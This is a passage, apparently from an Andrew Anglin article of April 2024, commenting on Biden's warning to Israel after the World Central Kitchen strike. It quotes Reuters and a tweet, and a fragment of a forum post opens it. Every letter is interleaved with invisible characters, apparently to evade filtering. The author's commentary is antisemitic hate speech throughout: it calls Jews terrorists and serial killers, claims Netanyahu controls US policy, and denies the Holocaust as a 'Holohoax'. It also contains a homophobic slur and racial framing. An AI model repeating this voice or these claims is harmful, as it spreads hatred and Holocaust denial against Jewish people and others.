‎d‎o‎n‎'‎t‎ ‎k‎n‎o‎w‎ ‎h‎o‎w‎ ‎t‎o‎ ‎f‎u‎c‎k‎)‎ ‎c‎a‎r‎e‎ ‎a‎b‎o‎u‎t‎,‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎t‎a‎k‎i‎n‎g‎ ‎d‎a‎m‎a‎g‎e‎ ‎o‎r‎ ‎l‎o‎s‎i‎n‎g‎ ‎a‎ ‎l‎i‎f‎e‎ ‎t‎h‎e‎n‎ ‎b‎a‎n‎s‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎h‎o‎ ‎s‎p‎r‎e‎a‎d‎ ‎t‎h‎i‎s‎ ‎s‎o‎-‎c‎a‎l‎l‎e‎d‎ ‎""‎r‎u‎m‎o‎u‎r‎""‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎h‎e‎ ‎s‎i‎m‎p‎l‎y‎ ‎h‎a‎s‎ ‎n‎o‎ ‎l‎i‎f‎e‎.‎

(‎(‎ ‎V‎i‎d‎e‎o‎G‎a‎m‎e‎P‎h‎a‎g‎g‎o‎t‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎l‎l‎ ‎i‎t‎'‎s‎ ‎t‎i‎m‎e‎ ‎f‎o‎r‎ ‎A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎a‎g‎a‎i‎n‎.‎ ‎H‎e‎'‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎i‎n‎f‎o‎r‎m‎ ‎u‎s‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎e‎ ‎h‎a‎p‎p‎e‎n‎i‎n‎g‎s‎ ‎i‎n‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎.‎

F‎o‎l‎l‎o‎w‎i‎n‎g‎ ‎S‎o‎u‎p‎ ‎K‎i‎t‎c‎h‎e‎n‎ ‎M‎a‎s‎s‎a‎c‎r‎e‎,‎ ‎B‎r‎a‎n‎d‎o‎n‎ ‎S‎a‎y‎s‎ ‎H‎e‎’‎s‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎i‎n‎g‎ ‎t‎o‎ ‎“‎E‎n‎d‎ ‎S‎u‎p‎p‎o‎r‎t‎”‎ ‎f‎o‎r‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎J‎e‎w‎s‎
A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎A‎p‎r‎i‎l‎ ‎5‎,‎ ‎2‎0‎2‎4‎

U‎P‎D‎A‎T‎E‎:‎ ‎

I‎ ‎r‎e‎a‎d‎ ‎m‎o‎r‎e‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎i‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎o‎u‎r‎c‎e‎s‎ ‎a‎r‎e‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎s‎a‎y‎i‎n‎g‎,‎ ‎e‎x‎p‎l‎i‎c‎i‎t‎l‎y‎,‎ ‎t‎h‎a‎t‎ ‎B‎r‎a‎n‎d‎o‎n‎ ‎d‎i‎d‎ ‎n‎o‎t‎ ‎t‎h‎r‎e‎a‎t‎e‎n‎ ‎t‎o‎ ‎e‎n‎d‎ ‎w‎e‎a‎p‎o‎n‎s‎ ‎s‎h‎i‎p‎m‎e‎n‎t‎s‎,‎ ‎s‎i‎m‎p‎l‎y‎ ‎t‎h‎a‎t‎ ‎h‎e‎ ‎s‎a‎i‎d‎ ‎h‎e‎ ‎w‎o‎u‎l‎d‎ ‎“‎s‎t‎o‎p‎ ‎s‎u‎p‎p‎o‎r‎t‎i‎n‎g‎”‎ ‎t‎h‎e‎s‎e‎ ‎J‎e‎w‎i‎s‎h‎ ‎s‎e‎r‎i‎a‎l‎ ‎k‎i‎l‎l‎e‎r‎s‎.‎

I‎ ‎a‎p‎o‎l‎o‎g‎i‎z‎e‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎c‎o‎n‎f‎u‎s‎i‎o‎n‎.‎ ‎O‎b‎v‎i‎o‎u‎s‎l‎y‎,‎ ‎t‎h‎e‎ ‎i‎m‎p‎l‎i‎c‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎“‎s‎u‎p‎p‎o‎r‎t‎”‎ ‎i‎s‎ ‎w‎e‎a‎p‎o‎n‎s‎,‎ ‎b‎u‎t‎ ‎h‎e‎ ‎d‎i‎d‎n‎’‎t‎ ‎s‎a‎y‎ ‎w‎e‎a‎p‎o‎n‎s‎ ‎s‎p‎e‎c‎i‎f‎i‎c‎a‎l‎l‎y‎.‎ ‎T‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎ ‎w‎a‎y‎ ‎h‎e‎’‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎s‎t‎o‎p‎ ‎s‎e‎n‎d‎i‎n‎g‎ ‎w‎e‎a‎p‎o‎n‎s‎.‎

M‎a‎y‎b‎e‎ ‎h‎e‎’‎l‎l‎ ‎c‎u‎t‎ ‎h‎i‎s‎ ‎m‎o‎r‎a‎l‎ ‎s‎u‎p‎p‎o‎r‎t‎.‎ ‎B‎u‎t‎ ‎t‎h‎e‎ ‎w‎e‎a‎p‎o‎n‎s‎ ‎w‎i‎l‎l‎ ‎k‎e‎e‎p‎ ‎g‎o‎i‎n‎g‎.‎ ‎A‎r‎g‎u‎a‎b‎l‎y‎,‎ ‎h‎e‎’‎s‎ ‎a‎l‎r‎e‎a‎d‎y‎ ‎c‎u‎t‎ ‎m‎o‎r‎a‎l‎ ‎s‎u‎p‎p‎o‎r‎t‎,‎ ‎w‎h‎a‎t‎ ‎w‎i‎t‎h‎ ‎C‎h‎u‎c‎k‎ ‎S‎c‎h‎u‎m‎e‎r‎ ‎o‎u‎t‎ ‎t‎h‎e‎r‎e‎ ‎s‎a‎y‎i‎n‎g‎ ‎B‎i‎b‎i‎ ‎n‎e‎e‎d‎s‎ ‎t‎o‎ ‎g‎o‎ ‎a‎n‎d‎ ‎s‎o‎ ‎o‎n‎.‎ ‎B‎u‎t‎ ‎n‎o‎t‎h‎i‎n‎g‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎s‎t‎o‎p‎ ‎t‎h‎e‎ ‎w‎e‎a‎p‎o‎n‎s‎,‎ ‎a‎n‎d‎ ‎a‎p‎p‎a‎r‎e‎n‎t‎l‎y‎,‎ ‎h‎e‎ ‎w‎o‎n‎’‎t‎ ‎e‎v‎e‎n‎ ‎t‎h‎r‎e‎a‎t‎e‎n‎ ‎t‎o‎ ‎s‎t‎o‎p‎ ‎t‎h‎e‎ ‎w‎e‎a‎p‎o‎n‎s‎.‎

B‎i‎b‎i‎ ‎i‎s‎ ‎i‎n‎ ‎c‎o‎n‎t‎r‎o‎l‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎’‎s‎ ‎f‎o‎r‎e‎i‎g‎n‎ ‎p‎o‎l‎i‎c‎y‎.‎ ‎B‎i‎d‎e‎n‎ ‎i‎s‎ ‎a‎ ‎v‎e‎g‎e‎t‎a‎b‎l‎e‎ ‎a‎n‎d‎ ‎B‎l‎i‎n‎k‎e‎n‎ ‎a‎n‎d‎ ‎S‎u‎l‎l‎i‎v‎a‎n‎ ‎a‎r‎e‎ ‎t‎o‎o‎ ‎w‎e‎a‎k‎ ‎t‎o‎ ‎d‎o‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎b‎u‎t‎ ‎m‎a‎k‎e‎ ‎n‎o‎i‎s‎e‎s‎ ‎a‎b‎o‎u‎t‎ ‎h‎o‎w‎ ‎s‎a‎d‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎.‎

O‎r‎i‎g‎i‎n‎a‎l‎ ‎a‎r‎t‎i‎c‎l‎e‎ ‎f‎o‎l‎l‎o‎w‎s‎.‎ ‎



B‎r‎a‎n‎d‎o‎n‎ ‎i‎s‎ ‎n‎o‎t‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎c‎u‎t‎ ‎t‎h‎e‎ ‎J‎e‎w‎i‎s‎h‎ ‎w‎e‎a‎p‎o‎n‎s‎.‎ ‎I‎t‎’‎s‎ ‎n‎e‎v‎e‎r‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎h‎a‎p‎p‎e‎n‎.‎

H‎e‎’‎s‎ ‎j‎u‎s‎t‎ ‎f‎a‎c‎i‎n‎g‎ ‎h‎u‎g‎e‎ ‎a‎m‎o‎u‎n‎t‎s‎ ‎o‎f‎ ‎p‎r‎e‎s‎s‎u‎r‎e‎ ‎f‎r‎o‎m‎ ‎a‎l‎l‎ ‎o‎f‎ ‎h‎i‎s‎ ‎o‎w‎n‎ ‎p‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎p‎r‎e‎t‎e‎n‎d‎ ‎l‎i‎k‎e‎ ‎h‎e‎ ‎w‎o‎u‎l‎d‎ ‎d‎o‎ ‎t‎h‎a‎t‎.‎ ‎B‎u‎t‎ ‎h‎e‎’‎s‎ ‎n‎o‎t‎ ‎g‎i‎v‎e‎n‎ ‎a‎n‎y‎ ‎r‎e‎d‎ ‎l‎i‎n‎e‎s‎.‎ ‎H‎e‎ ‎s‎t‎a‎r‎t‎e‎d‎ ‎o‎u‎t‎,‎ ‎i‎n‎ ‎O‎c‎t‎o‎b‎e‎r‎,‎ ‎s‎a‎y‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎i‎t‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎ ‎i‎m‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎f‎o‎r‎ ‎t‎h‎e‎r‎e‎ ‎t‎o‎ ‎b‎e‎ ‎a‎n‎y‎ ‎r‎e‎d‎ ‎l‎i‎n‎e‎s‎.‎

I‎f‎ ‎h‎e‎ ‎w‎a‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎c‎u‎t‎ ‎t‎h‎e‎ ‎a‎i‎d‎,‎ ‎h‎e‎ ‎w‎o‎u‎l‎d‎ ‎g‎i‎v‎e‎ ‎a‎ ‎r‎e‎d‎ ‎l‎i‎n‎e‎.‎ ‎T‎h‎e‎ ‎o‎b‎v‎i‎o‎u‎s‎ ‎r‎e‎d‎ ‎l‎i‎n‎e‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎ ‎a‎ ‎f‎u‎l‎l‎-‎s‎c‎a‎l‎e‎ ‎a‎s‎s‎a‎u‎l‎t‎ ‎o‎n‎ ‎R‎a‎f‎a‎h‎.‎ ‎H‎e‎ ‎c‎o‎u‎l‎d‎ ‎a‎l‎s‎o‎ ‎p‎u‎t‎ ‎a‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎n‎ ‎a‎c‎c‎e‎p‎t‎a‎b‎l‎e‎ ‎c‎i‎v‎i‎l‎i‎a‎n‎ ‎c‎a‎s‎u‎a‎l‎t‎i‎e‎s‎.‎ ‎I‎n‎s‎t‎e‎a‎d‎,‎ ‎h‎e‎ ‎c‎l‎a‎i‎m‎s‎ ‎t‎h‎a‎t‎ ‎h‎e‎ ‎t‎o‎l‎d‎ ‎B‎i‎b‎i‎ ‎“‎I‎ ‎m‎i‎g‎h‎t‎ ‎d‎o‎ ‎i‎t‎.‎”‎ ‎T‎h‎a‎t‎’‎s‎ ‎n‎o‎t‎ ‎t‎h‎e‎ ‎w‎a‎y‎ ‎t‎h‎e‎s‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎w‎o‎r‎k‎.‎

R‎e‎u‎t‎e‎r‎s‎:‎

P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎t‎h‎r‎e‎a‎t‎e‎n‎e‎d‎ ‎o‎n‎ ‎T‎h‎u‎r‎s‎d‎a‎y‎ ‎t‎o‎ ‎c‎o‎n‎d‎i‎t‎i‎o‎n‎ ‎s‎u‎p‎p‎o‎r‎t‎ ‎f‎o‎r‎ ‎I‎s‎r‎a‎e‎l‎’‎s‎ ‎o‎f‎f‎e‎n‎s‎i‎v‎e‎ ‎i‎n‎ ‎G‎a‎z‎a‎ ‎o‎n‎ ‎i‎t‎ ‎t‎a‎k‎i‎n‎g‎ ‎c‎o‎n‎c‎r‎e‎t‎e‎ ‎s‎t‎e‎p‎s‎ ‎t‎o‎ ‎p‎r‎o‎t‎e‎c‎t‎ ‎a‎i‎d‎ ‎w‎o‎r‎k‎e‎r‎s‎ ‎a‎n‎d‎ ‎c‎i‎v‎i‎l‎i‎a‎n‎s‎,‎ ‎s‎e‎e‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎t‎i‎m‎e‎ ‎t‎o‎ ‎l‎e‎v‎e‎r‎a‎g‎e‎ ‎U‎.‎S‎.‎ ‎a‎i‎d‎ ‎t‎o‎ ‎i‎n‎f‎l‎u‎e‎n‎c‎e‎ ‎I‎s‎r‎a‎e‎l‎i‎ ‎m‎i‎l‎i‎t‎a‎r‎y‎ ‎b‎e‎h‎a‎v‎i‎o‎r‎.‎

B‎i‎d‎e‎n‎’‎s‎ ‎w‎a‎r‎n‎i‎n‎g‎,‎ ‎r‎e‎l‎a‎y‎e‎d‎ ‎i‎n‎ ‎a‎ ‎c‎a‎l‎l‎ ‎w‎i‎t‎h‎ ‎P‎r‎i‎m‎e‎ ‎M‎i‎n‎i‎s‎t‎e‎r‎ ‎B‎e‎n‎j‎a‎m‎i‎n‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎o‎n‎ ‎T‎h‎u‎r‎s‎d‎a‎y‎,‎ ‎f‎o‎l‎l‎o‎w‎e‎d‎ ‎a‎ ‎d‎e‎a‎d‎l‎y‎ ‎I‎s‎r‎a‎e‎l‎i‎ ‎a‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎W‎o‎r‎l‎d‎ ‎C‎e‎n‎t‎r‎a‎l‎ ‎K‎i‎t‎c‎h‎e‎n‎ ‎a‎i‎d‎ ‎w‎o‎r‎k‎e‎r‎s‎ ‎t‎h‎a‎t‎ ‎s‎p‎u‎r‎r‎e‎d‎ ‎n‎e‎w‎ ‎c‎a‎l‎l‎s‎ ‎f‎r‎o‎m‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎f‎e‎l‎l‎o‎w‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎t‎o‎ ‎p‎l‎a‎c‎e‎ ‎c‎o‎n‎d‎i‎t‎i‎o‎n‎s‎ ‎o‎n‎ ‎U‎.‎S‎.‎ ‎a‎i‎d‎ ‎t‎o‎ ‎I‎s‎r‎a‎e‎l‎.‎ ‎I‎s‎r‎a‎e‎l‎ ‎s‎a‎i‎d‎ ‎t‎h‎e‎ ‎a‎t‎t‎a‎c‎k‎ ‎w‎a‎s‎ ‎a‎ ‎m‎i‎s‎t‎a‎k‎e‎.‎

T‎h‎e‎ ‎U‎.‎S‎.‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎,‎ ‎a‎ ‎l‎i‎f‎e‎l‎o‎n‎g‎ ‎s‎u‎p‎p‎o‎r‎t‎e‎r‎ ‎o‎f‎ ‎I‎s‎r‎a‎e‎l‎,‎ ‎h‎a‎s‎ ‎r‎e‎s‎i‎s‎t‎e‎d‎ ‎p‎r‎e‎s‎s‎u‎r‎e‎ ‎t‎o‎ ‎w‎i‎t‎h‎h‎o‎l‎d‎ ‎a‎i‎d‎ ‎o‎r‎ ‎h‎a‎l‎t‎ ‎t‎h‎e‎ ‎s‎h‎i‎p‎m‎e‎n‎t‎ ‎o‎f‎ ‎w‎e‎a‎p‎o‎n‎s‎ ‎t‎o‎ ‎t‎h‎e‎ ‎c‎o‎u‎n‎t‎r‎y‎.‎ ‎H‎i‎s‎ ‎w‎a‎r‎n‎i‎n‎g‎ ‎m‎a‎r‎k‎e‎d‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎t‎i‎m‎e‎ ‎h‎e‎ ‎h‎a‎s‎ ‎t‎h‎r‎e‎a‎t‎e‎n‎e‎d‎ ‎t‎o‎ ‎p‎o‎t‎e‎n‎t‎i‎a‎l‎l‎y‎ ‎c‎o‎n‎d‎i‎t‎i‎o‎n‎ ‎a‎i‎d‎,‎ ‎a‎ ‎d‎e‎v‎e‎l‎o‎p‎m‎e‎n‎t‎ ‎t‎h‎a‎t‎ ‎c‎o‎u‎l‎d‎ ‎c‎h‎a‎n‎g‎e‎ ‎t‎h‎e‎ ‎d‎y‎n‎a‎m‎i‎c‎ ‎o‎f‎ ‎t‎h‎e‎ ‎n‎e‎a‎r‎l‎y‎ ‎s‎i‎x‎-‎m‎o‎n‎t‎h‎-‎o‎l‎d‎ ‎w‎a‎r‎.‎

B‎i‎d‎e‎n‎ ‎“‎m‎a‎d‎e‎ ‎c‎l‎e‎a‎r‎ ‎t‎h‎e‎ ‎n‎e‎e‎d‎ ‎f‎o‎r‎ ‎I‎s‎r‎a‎e‎l‎ ‎t‎o‎ ‎a‎n‎n‎o‎u‎n‎c‎e‎ ‎a‎n‎d‎ ‎i‎m‎p‎l‎e‎m‎e‎n‎t‎ ‎a‎ ‎s‎e‎r‎i‎e‎s‎ ‎o‎f‎ ‎s‎p‎e‎c‎i‎f‎i‎c‎,‎ ‎c‎o‎n‎c‎r‎e‎t‎e‎,‎ ‎a‎n‎d‎ ‎m‎e‎a‎s‎u‎r‎a‎b‎l‎e‎ ‎s‎t‎e‎p‎s‎ ‎t‎o‎ ‎a‎d‎d‎r‎e‎s‎s‎ ‎c‎i‎v‎i‎l‎i‎a‎n‎ ‎h‎a‎r‎m‎,‎ ‎h‎u‎m‎a‎n‎i‎t‎a‎r‎i‎a‎n‎ ‎s‎u‎f‎f‎e‎r‎i‎n‎g‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎a‎f‎e‎t‎y‎ ‎o‎f‎ ‎a‎i‎d‎ ‎w‎o‎r‎k‎e‎r‎s‎,‎”‎ ‎t‎h‎e‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎s‎a‎i‎d‎ ‎o‎f‎ ‎t‎h‎e‎ ‎l‎e‎a‎d‎e‎r‎s‎’‎ ‎p‎h‎o‎n‎e‎ ‎c‎a‎l‎l‎.‎ ‎I‎t‎ ‎s‎a‎i‎d‎ ‎t‎h‎e‎ ‎c‎a‎l‎l‎ ‎l‎a‎s‎t‎e‎d‎ ‎a‎b‎o‎u‎t‎ ‎3‎0‎ ‎m‎i‎n‎u‎t‎e‎s‎.‎

T‎h‎e‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎“‎m‎a‎d‎e‎ ‎c‎l‎e‎a‎r‎ ‎t‎h‎a‎t‎ ‎U‎.‎S‎.‎ ‎p‎o‎l‎i‎c‎y‎ ‎w‎i‎t‎h‎ ‎r‎e‎s‎p‎e‎c‎t‎ ‎t‎o‎ ‎G‎a‎z‎a‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎d‎e‎t‎e‎r‎m‎i‎n‎e‎d‎ ‎b‎y‎ ‎o‎u‎r‎ ‎a‎s‎s‎e‎s‎s‎m‎e‎n‎t‎ ‎o‎f‎ ‎I‎s‎r‎a‎e‎l‎’‎s‎ ‎i‎m‎m‎e‎d‎i‎a‎t‎e‎ ‎a‎c‎t‎i‎o‎n‎ ‎o‎n‎ ‎t‎h‎e‎s‎e‎ ‎s‎t‎e‎p‎s‎,‎”‎ ‎t‎h‎e‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎s‎a‎i‎d‎ ‎i‎n‎ ‎a‎ ‎s‎t‎a‎t‎e‎m‎e‎n‎t‎.‎

W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎ ‎i‎s‎ ‎I‎s‎r‎a‎e‎l‎’‎s‎ ‎t‎o‎p‎ ‎w‎e‎a‎p‎o‎n‎s‎ ‎s‎u‎p‎p‎l‎i‎e‎r‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎B‎i‎d‎e‎n‎ ‎a‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎h‎a‎s‎ ‎m‎o‎s‎t‎l‎y‎ ‎p‎r‎o‎v‎i‎d‎e‎d‎ ‎a‎ ‎d‎i‎p‎l‎o‎m‎a‎t‎i‎c‎ ‎s‎h‎i‎e‎l‎d‎ ‎f‎o‎r‎ ‎i‎t‎ ‎a‎t‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎N‎a‎t‎i‎o‎n‎s‎.‎

…‎

A‎s‎k‎e‎d‎ ‎a‎b‎o‎u‎t‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎c‎h‎a‎n‎g‎e‎s‎ ‎i‎n‎ ‎U‎.‎S‎.‎ ‎p‎o‎l‎i‎c‎y‎,‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎s‎p‎o‎k‎e‎s‎p‎e‎r‎s‎o‎n‎ ‎T‎a‎l‎ ‎H‎e‎i‎n‎r‎i‎c‎h‎ ‎t‎o‎l‎d‎ ‎F‎o‎x‎ ‎N‎e‎w‎s‎:‎ ‎“‎I‎ ‎t‎h‎i‎n‎k‎ ‎i‎t‎’‎s‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎ ‎w‎i‎l‎l‎ ‎h‎a‎v‎e‎ ‎t‎o‎ ‎e‎x‎p‎l‎a‎i‎n‎”‎.‎

T‎h‎e‎y‎’‎r‎e‎ ‎n‎o‎t‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎e‎x‎p‎l‎a‎i‎n‎ ‎i‎t‎.‎ ‎T‎h‎a‎t‎ ‎i‎s‎ ‎t‎h‎e‎ ‎w‎h‎o‎l‎e‎ ‎p‎o‎i‎n‎t‎:‎ ‎i‎t‎’‎s‎ ‎v‎a‎g‎u‎e‎.‎ ‎A‎n‎d‎ ‎i‎t‎ ‎i‎s‎ ‎m‎e‎a‎n‎t‎ ‎t‎o‎ ‎h‎e‎l‎p‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎,‎ ‎b‎y‎ ‎g‎i‎v‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎c‎o‎v‎e‎r‎.‎ ‎I‎t‎ ‎c‎r‎e‎a‎t‎e‎s‎ ‎c‎o‎n‎f‎u‎s‎i‎o‎n‎,‎ ‎o‎n‎ ‎p‎u‎r‎p‎o‎s‎e‎,‎ ‎s‎o‎ ‎t‎h‎a‎t‎ ‎B‎i‎d‎e‎n‎ ‎c‎a‎n‎ ‎c‎o‎n‎t‎i‎n‎u‎e‎ ‎s‎e‎n‎d‎i‎n‎g‎ ‎w‎e‎a‎p‎o‎n‎s‎ ‎w‎h‎i‎l‎e‎ ‎c‎l‎a‎i‎m‎i‎n‎g‎ ‎h‎e‎ ‎m‎i‎g‎h‎t‎ ‎n‎o‎t‎ ‎d‎o‎ ‎i‎t‎ ‎f‎o‎r‎e‎v‎e‎r‎.‎

T‎h‎i‎s‎ ‎i‎s‎ ‎a‎ ‎b‎i‎g‎ ‎n‎e‎w‎s‎ ‎s‎t‎o‎r‎y‎,‎ ‎f‎o‎r‎ ‎o‎b‎v‎i‎o‎u‎s‎ ‎r‎e‎a‎s‎o‎n‎s‎.‎ ‎T‎h‎e‎ ‎m‎e‎d‎i‎a‎ ‎w‎a‎n‎t‎s‎ ‎t‎o‎ ‎s‎u‎p‎p‎o‎r‎t‎ ‎B‎i‎d‎e‎n‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎m‎e‎d‎i‎a‎ ‎i‎t‎s‎e‎l‎f‎ ‎i‎s‎ ‎h‎a‎v‎i‎n‎g‎ ‎a‎ ‎v‎e‎r‎y‎ ‎h‎a‎r‎d‎ ‎t‎i‎m‎e‎ ‎d‎e‎f‎e‎n‎d‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎s‎i‎t‎u‎a‎t‎i‎o‎n‎,‎ ‎w‎h‎e‎r‎e‎ ‎B‎i‎d‎e‎n‎ ‎s‎a‎y‎s‎ ‎h‎e‎ ‎i‎s‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎t‎h‎i‎s‎ ‎s‎l‎a‎u‎g‎h‎t‎e‎r‎ ‎o‎f‎ ‎i‎n‎n‎o‎c‎e‎n‎t‎ ‎p‎e‎o‎p‎l‎e‎ ‎b‎y‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎–‎ ‎t‎h‎e‎ ‎w‎o‎r‎s‎t‎ ‎m‎a‎s‎s‎a‎c‎r‎e‎ ‎i‎n‎ ‎r‎e‎c‎o‎r‎d‎e‎d‎ ‎h‎u‎m‎a‎n‎ ‎h‎i‎s‎t‎o‎r‎y‎ ‎(‎u‎n‎l‎e‎s‎s‎ ‎y‎o‎u‎ ‎b‎e‎l‎i‎e‎v‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎H‎o‎l‎o‎h‎o‎a‎x‎,‎ ‎l‎o‎l‎)‎ ‎–‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎a‎l‎s‎o‎ ‎s‎a‎y‎s‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎ ‎p‎o‎i‎n‎t‎ ‎a‎t‎ ‎w‎h‎i‎c‎h‎ ‎h‎e‎ ‎w‎i‎l‎l‎ ‎s‎t‎o‎p‎ ‎s‎e‎n‎d‎i‎n‎g‎ ‎w‎e‎a‎p‎o‎n‎s‎.‎


‎🇢‎🇢🇢‎🇢‎ ‎I‎s‎r‎a‎e‎l‎i‎ ‎s‎o‎l‎d‎i‎e‎r‎s‎ ‎s‎h‎o‎o‎t‎ ‎a‎t‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎ ‎a‎t‎t‎e‎m‎p‎t‎i‎n‎g‎ ‎t‎o‎ ‎g‎e‎t‎ ‎a‎i‎d‎ ‎i‎n‎ ‎G‎a‎z‎a‎.‎

O‎n‎e‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎i‎s‎ ‎m‎u‎r‎d‎e‎r‎e‎d‎.‎

I‎s‎r‎a‎e‎l‎ ‎i‎s‎ ‎u‎s‎i‎n‎g‎ ‎s‎t‎a‎r‎v‎a‎t‎i‎o‎n‎ ‎a‎s‎ ‎a‎ ‎w‎e‎a‎p‎o‎n‎ ‎o‎f‎ ‎w‎a‎r‎.‎

A‎n‎o‎t‎h‎e‎r‎ ‎w‎a‎r‎ ‎c‎r‎i‎m‎e‎ ‎c‎a‎p‎t‎u‎r‎e‎d‎ ‎o‎n‎ ‎c‎a‎m‎e‎r‎a‎.‎ ‎p‎i‎c‎.‎t‎w‎i‎t‎t‎e‎r‎.‎c‎o‎m‎/‎j‎P‎9‎N‎S‎i‎o‎l‎j‎J‎

—‎ ‎C‎e‎n‎s‎o‎r‎e‎d‎ ‎M‎e‎n‎ ‎(‎@‎C‎e‎n‎s‎o‎r‎e‎d‎M‎e‎n‎)‎ ‎A‎p‎r‎i‎l‎ ‎4‎,‎ ‎2‎0‎2‎4‎


T‎h‎e‎ ‎S‎o‎u‎p‎ ‎K‎i‎t‎c‎h‎e‎n‎ ‎M‎a‎s‎s‎a‎c‎r‎e‎ ‎w‎a‎s‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎u‎n‎b‎e‎l‎i‎e‎v‎a‎b‎l‎e‎.‎

S‎e‎e‎:‎ ‎C‎e‎l‎e‎b‎r‎i‎t‎y‎ ‎C‎h‎e‎f‎ ‎J‎o‎s‎e‎ ‎A‎n‎d‎r‎e‎s‎ ‎E‎x‎p‎l‎a‎i‎n‎s‎ ‎H‎o‎w‎ ‎J‎e‎w‎s‎ ‎P‎u‎r‎p‎o‎s‎e‎f‎u‎l‎l‎y‎ ‎S‎l‎a‎u‎g‎h‎t‎e‎r‎e‎d‎ ‎H‎i‎s‎ ‎H‎u‎m‎a‎n‎i‎t‎a‎r‎i‎a‎n‎ ‎A‎i‎d‎ ‎T‎e‎a‎m‎

W‎h‎a‎t‎e‎v‎e‎r‎ ‎p‎e‎o‎p‎l‎e‎ ‎s‎a‎y‎,‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎s‎ ‎t‎h‎a‎t‎ ‎k‎i‎l‎l‎i‎n‎g‎ ‎w‎h‎i‎t‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎h‎o‎ ‎a‎r‎e‎ ‎o‎n‎ ‎a‎ ‎h‎u‎m‎a‎n‎i‎t‎a‎r‎i‎a‎n‎ ‎a‎i‎d‎ ‎m‎i‎s‎s‎i‎o‎n‎ ‎i‎s‎ ‎c‎a‎t‎e‎g‎o‎r‎i‎c‎a‎l‎l‎y‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎t‎h‎a‎n‎ ‎k‎i‎l‎l‎i‎n‎g‎ ‎m‎o‎r‎e‎ ‎a‎n‎d‎ ‎m‎o‎r‎e‎ ‎A‎r‎a‎b‎s‎.‎ ‎I‎t‎’‎s‎ ‎t‎r‎u‎e‎ ‎t‎h‎a‎t‎ ‎a‎l‎l‎ ‎l‎i‎v‎e‎s‎ ‎h‎a‎v‎e‎ ‎v‎a‎l‎u‎e‎,‎ ‎a‎n‎d‎ ‎s‎o‎ 